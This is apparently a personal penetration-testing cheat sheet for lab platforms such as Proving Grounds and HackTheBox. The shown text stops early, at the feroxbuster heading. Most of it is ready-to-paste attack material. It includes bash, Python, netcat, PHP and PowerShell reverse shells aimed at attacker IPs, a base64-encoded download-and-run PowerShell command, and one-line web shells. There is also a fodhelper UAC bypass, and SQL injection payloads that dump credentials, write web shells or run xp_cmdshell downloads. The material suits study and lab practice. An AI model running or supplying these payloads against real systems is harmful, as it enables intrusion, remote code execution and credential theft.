# Table of Content
- [General](#general)
  - [Important Files](#important-files)
  - [Upgrade Shell](#upgrade-shell)
  - [Reverse Shell](#reverse-shell)
  - [Web Shell](#web-shell)
  - [UAC Bypass](#uac-bypass)
- [PG Grounds & HTB](#pg-grounds-&-htb)
  - [Linux Boxes](#linux-boxes)
- [SQL](#sql)
  - [MySQL](#mysql)
  - [Mssql](#mssql)
  - [sqlite](#salite)
  - [SQLi](#sqli)
 
- [Tools](#tools)
  - [tar](#tar)
  - [proof.txt](#proof.txt)
  - [gitdumper](#gitdumper)
  - [KPCLI && kdbx](#kpcli_&&_kdbx)
  - [whatweb](#whatweb)
  - [ntpdate](#ntpdate)
  - [MSSQL](#mssql)
  - [certipy](#certipy)
  - [netexec](#netexec)
  - [Nslookup](#nslookup)
  - [Dig](#dig)
  - [cewl](#cewl)
  - [sudo](#sudo)
  - [Vim](#vim)
  - [NMAP](#nmap)
  - [feroxbuster](#feroxbuster)
  - [gobuster](#gobuster)
  - [nikto](#nikto)
  - [wfuzz](#wfuzz)
  - [ffuf](#ffuf)
  - [xmllint](#xmllint)
  - [curl](#curl)
  - [wget](#wget)
  - [SCP](#scp)
  - [Python](#python)
  - [Hashcat](#hashcat)
  - [John The Ripper](#john-the-ripper)
  - [pspy](#pspy)
  - [Cross Compiling](#cross-compiling)
  - [xfreerdp](#xfreerdp)
  - [rdesktop](#rdesktop)
  - [Rubeus](#rubeus)
  - [kerbrute](#kerbrute)
  - [Impacket](#impacket)
  - [LDAPSearch](#ldapsearch)
  - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
  - [GMSAPasswordReader](#GMSAPasswordReader)
  - [smbserver](#smbserver)
  - [Rogue LDAP Server](#rogue-ldap-server)
  - [chisel](#chisel)
  - [Responder](#responder)
  - [Hydra](#hydra)
  - [socat](#socat)
  - [Cadaver](#cadaver)
  - [dig](#dig)
  - [dnsenum](#dnsenum)
  - [McAfee](#McAfee)
  - [WMI](#wmi)
  - [dnsrecon](#dnsrecon)
  - [WinRM](#winrm)
  - [sc.exe](#sc.exe)
  - [smtp-user-enum](#smtp-user-enum)
  - [bash](#bash)
- [SSH](#ssh)
  - [SSH KEY](#ssh-key)
  - [SSH Tunneling](#ssh-tunneling)
- [Password Attacks](#password_attacks)
- [Web Attacks](#web-attacks)
  - [Checklist](#checklist)
  - [Webroot](#webroot)
  - [General Tips](#general-tips)
  - [API Response](#api-response)
  - [Filemanater](#filemanager)
  - [Input Form](#input-form)
  - [Directory Traversal](#directory-traversal)
  - [Local File Inclusion](#local-file-inclusion)
  - [PHP File Upload Bypass](#php-file-upload-bypass)
  - [File Upload Exploit](#file_upload_exploit)
  - [Command Injection](#command_injection)
- [NFS](#nfs)
- [SMB](#smb)
- [FTP](#ftp)
- [Jenkins](#jenkins)
- [Joomla](#joomla)
- [Drupal](#drupal)
- [Splunk](#splunk)
- [PRTG Network Monitor](#prtg_network_monitor)
- [Wordpress](#wordpress)
- [Tomcat CGI](#tomcat_cgi)
- [Active Directory](#active-directory)
- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Manual Enumeration](#manual-enumeration)
  - [Service Binary Hijacking](#service-binary-hijacking)
  - [Service DLL Hijacking](#service-dll-hijacking)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Scheduled Tasks](#scheduled-tasks)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Linux Manual Enumeration](#linux-manual-enumeration)
  - [Linux Privilege Strategy](#linux-privilege-strategy)
  - [Common Linux Privilege Escalation](#common-linux-privilege-escalation)
    - [Exploit tar with wilrdcard](#exploit-tar-with-wildcard)
    - [Edit /etc/sudoers](#edit-/etc/sudoers)
    - [Exploit 7z with wildcard](#exploit-7z-with-wildcard)

# General
## Important Files
- Windows
```bash
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\
C:/Users/Administrator/NTUser.dat
C:/xampp/phpMyAdmin/config.inc.php
C:\ProgramData\McAfee\Agent\DB\ma.db
```

- Linux
```bash
/opt/*
/var/mail
/var/log/apache2/access.log
/config/.htusers.php
/proc/self/environ
/proc/self/cmdline
/home/user/.bash_history
/home/user/.bash_aliases
/etc/passwd
/etc/shadow
/etc/aliases

# python related
main.py
app.py
settings.ini
applicationName.config
applicationName.cfg
```
## Upgrade Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
  stty raw -echo
  fg
  [Enter]
  [Enter]
  export TERM=xterm-256color
  stty rows 67 columns 318
```

## Reverse Shell
```bash
# bash reverse shell
bash -i >& /dev/tcp/192.168.45.x/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# when escaping double quotes
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
# when using os
os.system('nc 192.168.45.175 80 -e /bin/sh')

#netcat reverse shell
nc -e /bin/sh 192.168.45.176 80

#PHP reverse shell
php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'


# Powershell: w powercat
IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell

# when executing with base64 encoded
powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=

# Powershell: wo powercat
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#############################################################################################
# Powershell: Create powershell reverse shell on kali linux
$ kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText

#############################################################################################
# powershell with nishang
## download and move shell's location && change file name
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.7:5555/shell.ps1')

```

## Web Shell
```bash
# php
<?php system($_REQUEST["cmd"]); ?>

# jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# asp
<% eval request("cmd") %>

echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php




```

## UAC Bypass
- Auto elevation
  - msconfig
  - azman.msc
- Using fodhelper
```bash
# first fire up netcat listener

# method1 
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

# method2
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

# PG Grounds & HTB
## Linux Boxes

**Twiggy**
  - Foothold:
    - curl -v http://192.168.x.x:3000/
    - [Saltstack Exploit]()
  - No privesc

**Exfiltrated**
  - Foothold:
    - Subrion Exploit with admin:admin credentials
    - Manually uploaded a .phar file
  - PrivEsc:
    - Found a cronjob running every minute
    - /opt/image-exif.sh
    - Exiftool exploit and create malicious jpg file

**Astronaut**
  - Foothold:
    - [GRAV CMS Exploit](https://github.com/CsEnox/CVE-2021-21425/tree/main)
  - PrivEsc:
    - Uncommon setuid binaries
    - [/usr/bin/php7.4 exploit](https://gtfobins.github.io/gtfobins/php/#suid)

**Blackgate**
  - Foothold:
    - [Redis 4.0.14 Exploit](https://github.com/Ridter/redis-rce)
  - PrivEsc:
    - pwnkit

**Boolean**
  - Foothold: 
    - Create a useraccount and go checkout confirmation part. We have to intercept the email edit request with burp and add user[confirmed]=true
    - On upload page, when we try downloading files, we can see cwd which means current working directory. We found directory traversal
    - After checking username list we create an ssh key set and add it to authorized keys and upload it to one of the found users and login as that user using ssh -i
  - PrivEsc:
    - Check user's .bash_aliases file: our owner has root key and can login as root
    - ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true

**Clue**
  - Foothold:
    - Cassandra Exploit: directory traversal
    - from proc/self/cmdline, we found cassie's name and password -> didn't work for ssh
    - FreeSWITCH mod_event_socket was running so tried exploit and didn't work because password is different
    - Found FreeSWITCH mod_event_socket password through cassandra's exploit
  - PrivEsc: pivoting twice
    - Switch user as cassie
    - cassie can run cassandra-web with sudo privilege. since it's running with root privilege, we can grab anything as root
    - Read .bash_history of anthony and figure out that he can login into ssh as root
    - Shell as root

**Law**
  - Foothold:
    - [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
    - Change POST /htmLawedTest.php to POST /
    - Exec code I used is included [Proving Grounds Law writeup](https://www.notion.so/Law-28c97105f0134218b24a14a5fcf2bfc3)
  - PrivEsc: cronjob that wasn't detected by linpeas
    - Run `./pspy64 -pf -i 1000`
    - Check `CMD: UID=0     PID=34261  | /bin/sh -c /var/www/cleanup.sh`
    - /var/www/cleanup.sh is owned by the initial shell user
    - `echo "nc 192.168.45.175 80 -e /bin/sh" > cleanup.sh`

**GLPI**
  - Foothold: [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
    - Exec code I used is included [Proving Grounds GLPI writeup](https://www.notion.so/GLPI-changeuserpass-e1451beb5374490b8de5d1558598aaa4)
  - PrivEsc:
    - linpeas: Searching passwords in config PHP files
      - /var/www/glpi/config/config_db.php
      - Found db username and password
      - Found another user's password hash(betty)
      - Couldn't crack the bash
      - Updated Betty's password hash
      - Log in as betty on GLPI and found a ticket about betty's password
      - Login as betty through ssh
    - linpeas: Interesting writable files owned by me or writable by everyone
      - /opt/jetty/jetty-base/webapps
      - There is also an active port on 8080
      - Type: [Jetty RCE exploit](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)

## Windows Boxes
  - Foothold: 
    - Remote File Inclusion/Local File Inclusion
    - ?page=C:/Windows/System32/drivers/etc/hosts
    - ?page=http://192.168.45.208/php-rev-shell.php

# SQL
## MySQL
Check if MySQL is running with privileged accoun

```bash
# MySQL configuration file
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

# Finger printing with nmap
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

# mysql login
mysql -u 'root' -h 192.168.183.122 -p
mysql -u 'root' -h 192.168.183.122 -pPassword

# Creating a database
CREATE DATABASE users;

# Creating a table
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

# Set id filed to auto increment
id INT NOT NULL AUTO_INCREMENT,

# Set username to be unique
username VARCHAR(100) UNIQUE NOT NULL,

# default the date
date_of_joining DATETIME DEFAULT NOW(),

# primary key
PRIMARY KEY (id)

# list the table structure with its fields and data types.
DESCRIBE logins;

# general usage
show databases;
use user;
show tables;
select * from users_secure;
select version();
select system_user();   # current db user 

# Add a new row
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
INSERT INTO `users` (`id`, `user`, `password`, `date`) VALUES (NULL, 'nick', 'password', '123456789');

# Update/Edit
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
UPDATE logins SET password = 'change_password' WHERE id > 1;
update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"

# Upload a php file
select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php"
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

# Move Files
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

#remove tables and databases
DROP TABLE logins;

# ALTER Statement(change the name of any table and any of its fields or to delete or add a new column to an existing table)
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;

# Sorting Results
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;

# Limit results
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;

# LIKE Clause
SELECT * FROM logins WHERE username LIKE 'admin%';
# this will match with three characters
SELECT * FROM logins WHERE username like '___';

# URL encoded
'	%27
"	%22
#	%23
;	%3B
)	%29

# Auth Bypass with OR operator
admin' or '1'='1
something' or '1'='1

# Auth Bypass with comments
admin' --
admin')--

# Error-based Payloads
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

# UNION-based payloads
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //

# INFORMATION_SCHEMA
## SCHEMATA table in the INFORMATION_SCHEMA database contains information about all databases
## The SCHEMA_NAME column contains all the database names currently present.
## UNION SQL injection to get all the databases names
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

## Find the current database
cn' UNION select 1,database(),2,3-- -

## TABLES table contains information about all tables throughout the database
## TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

## COLUMNS table contains information about all columns present in all the databases.
## COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

## UNION-based using INFORMATION_SCHEMA database to get current database's table, column, database name
' union select null, table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //


# User && Privileges
## DB User
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

## UNION injection to read user info
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

## User Privileges(check if we have super_user privilege && FILE privilege..)
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

## LOAD FILE
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

# FILE WRITE PRIV
- User with FILE privilege enabled
- MySQL global secure_file_priv variable not enabled
- Write access to the location we want to write to on the back-end server

# Check if we have file write privilege
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

# php webshell using file write privilege
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -


# Blind SQL Injections
##boolean-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
#time-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

# MySQL Fingerprinting
SELECT @@version
: When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'
In MSSQL it returns MSSQL version. Error with other DBMS.

SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS

SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
```

## MSSQL
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
select name from sys.databases

# db version
SELECT @@version;

# existing tables
SELECT * FROM offsec.information_schema.tables;

# select table
select * from offsec.dbo.users;

# try xp_cmdshell
> xp_cmdshell whoami
> enable_xp_cmdshell

# try xp_dirtree
> xp_dirtree c:\
> xp_dirtree c:\inetpub\wwwroot
> 
```

## sqlite
```bash
sqlitebrowser ma.db
```


## SQLi
- mssql command injection
```bash
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --

or
sudo Responder -I tun0 -A
';EXEC xp_dirtree \\192.168.45.176\share

or
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--
```

- mssqli UNION-based Payloads
```bash
# check number of the column
' UNION ALL select 1, 2 --
' UNION select 1, 2 --;
```

- mssqli Blind SQL Injections
```bash
# check if its working
'; IF (1=1) WAITFOR DELAY '0:0:10';--
'; IF (1=2) WAITFOR DELAY '0:0:10';--

'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--

# we blindly verify that there is a column named USERNAME in the table USERS.
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'user%')=1) WAITFOR DELAY '0:0:10';--

# figure out the name of the column holding the password
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'passw%')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--

# find username
USERNAME like 'a%', USERNAME like 'b%', USERNAME like 'c%'
'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--

# update password
'; update users set password_hash = 'tacos123' where username = 'butch';--
'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--

# check if password has been updated
'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(username) from users where username = 'butch' and password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb')=1) WAITFOR DELAY '0:0:10';--
```

- postgresql command injection
```bash
' order by 7 -- //
' union select 1, 1, 1, 1, 1, 1 -- //
' union select 'd', 1, 1, 'd', 'd', null -- //

# Current user
' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //

# Use cast to cause error to get the database
' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
## ERROR
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />

# Use case to find out tables
cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)

# Use cast to find out columns for each table
cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)

# Use cast to find out row for each column
cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)

# Get current user's password!
' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
```

## Tools
### tar
```bash
# extract its contents
tar xvf captcha-8.x-1.2.tar.gz

# create an archive
tar cvf captcha.tar.gz captcha/
```

### proof.txt
```bash
# When we have a random txt file instead of proof.txt
PS C:\Users\Administrator\Desktop> Get-Item -path hm.txt -stream *

FileName: C:\Users\Administrator\Desktop\hm.txt

Stream                   Length
------                   ------
:$DATA                       36
root.txt                     34

Get-Content -path hm.txt -stream root.txt

# If powershell is not working..
dir /R
more < hm.txt:root.txt
```


### gitdumper
```bash
git-dumper http://192.168.234.144:80/.git ./gitdumps 
```

### kpcli && kdbx
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 

sudo apt install kpcli
kpcli --kdb=Database.kdbx
show -f 2
```

### whatweb
```bash
whatweb -a3 https://www.facebook.com -v
```


### ntpdate
```bash
sudo ntpdate 10.10.x.x
```



### certipy (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
```bash
certipy find -u raven -p password -dc-ip 10.x.x.x -stdout -vulnerable

certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -add-officer raven

# use subca(but we can list which templates are available)
(certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -list-templates)
certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -enbable-template subca

# upn will set to administrator
certipy req -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb

# force request
certipy ca -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -issue-request 13

# retrieve
certipy req -u raven -p password -dc-ip 10.x.x.x -ca manager-dc01-ca -retrieve 13

# use certificate
certipy auth -pfx administrator.pfx
```

### netexec
```bash
# if user exists, it will say "KDC_ERR_PREAUTH_FAILED"
# if user doesn't exist, it will say "KDC_ERR_C_PRINCIPAL_UNKNOWN"
netexec smb 10.10.x.x -k -u 'guest' -p ''

# see if we can get users information through guest account(guest account has blank password)
netexec smb 10.10.x.x -u 'guest' -p '' --users

# we're using rid to find valid usernames
netexec smb 10.10.x.x -u 'guest' -p '' --rid-brute 6000

# use username as password
# --no-bruteforce will just read the file sequentially
netexec smb 10.x.x.x -u users.txt -p users.txt --no-bruteforce --continue-on-success

netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
```

### Nslookup
```bash
# Interactive mode
> nslookup
> server 10.10.10.100
> 127.0.0.1
> 10.10.10.100

#A Records
nslookup $TARGET
nslookup -query=A $TARGET

#Nameserver
nslookup -type=NS zonetransfer.me

#Testing for ANY and AXFR Zone Transfer
nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja

#PTR Records for an IP Address
nslookup -query=PTR 31.13.92.36

#ANY Existing Records
nslookup -query=ANY $TARGET

#TXT Records
nslookup -query=TXT $TARGET

#MX Records
nslookup -query=MX $TARGET
```

### dig
```bash
#A Records
dig facebook.com @1.1.1.1
dig a www.facebook.com @1.1.1.1

#Nameserver
dig ns inlanefreight.htb @10.129.14.128

# PTR record
dig -x 31.13.92.36 @1.1.1.1

#ANY Existing Records
dig any inlanefreight.htb @10.129.14.128

#TXT Records
dig CH TXT version.bind 10.129.120.85

#MX Records
dig mx facebook.com @1.1.1.1

dig soa www.inlanefreight.com


dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128

```


### cewl
```bash
cewl http://10.129.200.170/nibbleblog/
```

### sudo
```bash
#switch to root user
sudo su -

# run command as lamster
sudo -u lamster /bin/echo Hello World!

```

### Vim
```bash
x	Cut character
dw	Cut word
dd	Cut full line
yw	Copy word
yy	Copy full line
p	Paste
:1	Go to line number 1.
:w	Write the file, save
:q	Quit
:q!	Quit without saving
:wq	Write and quit

```

### NMAP
```bash
# update nmap scripts (/usr/share/nmap/scripts/)
sudo nmap --script-updatedb

# grep ftp (or other) scripts
find / -type f -name ftp* 2>/dev/null | grep scripts

# locate certain scripts
locate scripts/citrix

# running nmap script
nmap --script <script name> -p<port> <host>
nmap --script smb-os-discovery.nse -p445 10.10.10.40

# banner grabbing
nmap -sV --script=banner <target>

# host discovery (-sn:	Disables port scanning.)
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5

# host discovery with provided hosts.lst file(-iL	Performs defined scans against targets in provided 'hosts.lst' list.)
sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5

# host discovery with multiple hosts
sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5

# host discovery with ARP Req/Res(-PE	Performs the ping scan by using 'ICMP Echo requests' against the target)
sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace
sudo nmap 10.129.2.18 -sn -oA host -PE --reason

# host discovery with ICMP packet(by disabling arp-ping)
sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping

```

### feroxbuster 
```bash
